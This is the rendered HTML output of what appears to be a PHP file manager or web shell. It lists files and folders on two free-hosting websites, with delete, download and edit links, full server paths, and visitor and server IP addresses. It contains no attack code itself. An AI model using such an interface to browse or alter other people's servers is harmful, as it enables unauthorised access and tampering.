                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::emoticones.php">emoticones.php</a></td>
                    <td>Archivo</td>
                    <td>1.05 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/emoticones.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/emoticones.php::emoticones.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::emoticones.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::favicon.ico">favicon.ico</a></td>
                    <td>Archivo</td>
                    <td>1.12 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/favicon.ico::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/favicon.ico::favicon.ico::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::favicon.ico">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::index.php">index.php</a></td>
                    <td>Archivo</td>
                    <td>11.18 KB</td>
                    <td><span class="si_permisos">rw-rw-rw-</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/index.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/index.php::index.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::index.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::php.ini">php.ini</a></td>
                    <td>Archivo</td>
                    <td>47 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/php.ini::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/php.ini::php.ini::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::php.ini">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::robots.txt">robots.txt</a></td>
                    <td>Archivo</td>
                    <td>244 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/robots.txt::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/robots.txt::robots.txt::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::robots.txt">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sitemap.xml">sitemap.xml</a></td>
                    <td>Archivo</td>
                    <td>94.43 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sitemap.xml::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sitemap.xml::sitemap.xml::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sitemap.xml">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sp-widget.php">sp-widget.php</a></td>
                    <td>Archivo</td>
                    <td>2.7 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sp-widget.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sp-widget.php::sp-widget.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sp-widget.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sub-head.php">sub-head.php</a></td>
                    <td>Archivo</td>
                    <td>250.81 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sub-head.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sub-head.php::sub-head.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sub-head.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::validar_char.php">validar_char.php</a></td>
                    <td>Archivo</td>
                    <td>352 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/validar_char.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/validar_char.php::validar_char.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::validar_char.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::vprevia.php">vprevia.php</a></td>
                    <td>Archivo</td>
                    <td>6.15 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/vprevia.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/vprevia.php::vprevia.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::vprevia.php">Editar</a>
                    </td>
                    </tr></table><div id="pie">
    <div id="pie_logo"></div><a id="servidor" href="http://201.139.155.111/">Tu IP: 201.139.155.111</a>
    <a id="servidor" href="http://209.190.24.9/">IP del servidor: 209.190.24.9</a>
    <span id="carga" href="#">0.331 seg</span>
    </div> <table>
            <tr class="primer_fila">
                <td></td>
                <td>Nombre</td>
                <td>Tipo</td>
                <td>Tamaño</td>
                <td>Permisos</td>
                <td class="opciones">Opciones</td>
            </tr><tr valign="top">
                        <td class="enlace"></td>
                        <td><a href="?dir::">..</a></td>
                        <td>Enlace</td>
                        <td></td>
                        <td><span class="no_permisos">---------</span></td>
                        <td></td>
                    </tr><tr valign="top">
                        <td class="enlace"></td>
                        <td><a href="?dir::">.</a></td>
                        <td>Enlace</td>
                        <td></td>
                        <td><span class="no_permisos">---------</span></td>
                        <td></td>
                        </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/admin">admin</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/admin::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comunidades">comunidades</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comunidades::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/cuenta">cuenta</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/cuenta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/images">images</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/images::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/includes">includes</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/includes::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/lab">lab</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/lab::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mensajes">mensajes</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mensajes::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/notificaciones">notificaciones</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/notificaciones::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recaptcha">recaptcha</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recaptcha::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/rss">rss</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/rss::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/search">search</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/search::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/socialads">socialads</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/socialads::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::.htaccess">.htaccess</a></td>
                    <td>Archivo</td>
                    <td>3.81 KB</td>
                    <td><span class="si_permisos">rw-r--r--</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/.htaccess::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/.htaccess::.htaccess::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::.htaccess">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::404.php">404.php</a></td>
                    <td>Archivo</td>
                    <td>7.71 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/404.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/404.php::404.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::404.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.form.php">agregar.form.php</a></td>
                    <td>Archivo</td>
                    <td>12.8 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.form.php::agregar.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.php">agregar.php</a></td>
                    <td>Archivo</td>
                    <td>2.65 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.php::agregar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::anuncie.form.php">anuncie.form.php</a></td>
                    <td>Archivo</td>
                    <td>3.27 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/anuncie.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/anuncie.form.php::anuncie.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::anuncie.form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::bloqueados-cambiar.php">bloqueados-cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>937 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/bloqueados-cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/bloqueados-cambiar.php::bloqueados-cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::bloqueados-cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borrador.form.php">borrador.form.php</a></td>
                    <td>Archivo</td>
                    <td>14.15 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borrador.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borrador.form.php::borrador.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borrador.form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borradores.php">borradores.php</a></td>
                    <td>Archivo</td>
                    <td>2.52 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borradores.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borradores.php::borradores.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borradores.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-google.php">buscador-google.php</a></td>
                    <td>Archivo</td>
                    <td>10.12 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-google.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-google.php::buscador-google.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-google.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-skynet.php">buscador-skynet.php</a></td>
                    <td>Archivo</td>
                    <td>16.1 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-skynet.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-skynet.php::buscador-skynet.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-skynet.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-tags.php">buscador-tags.php</a></td>
                    <td>Archivo</td>
                    <td>16.01 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-tags.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-tags.php::buscador-tags.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-tags.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador.php">buscador.php</a></td>
                    <td>Archivo</td>
                    <td>19.21 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador.php::buscador.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscadordegooles.php">buscadordegooles.php</a></td>
                    <td>Archivo</td>
                    <td>7.46 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscadordegooles.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscadordegooles.php::buscadordegooles.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscadordegooles.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscadorweb.php">buscadorweb.php</a></td>
                    <td>Archivo</td>
                    <td>19.36 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscadorweb.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
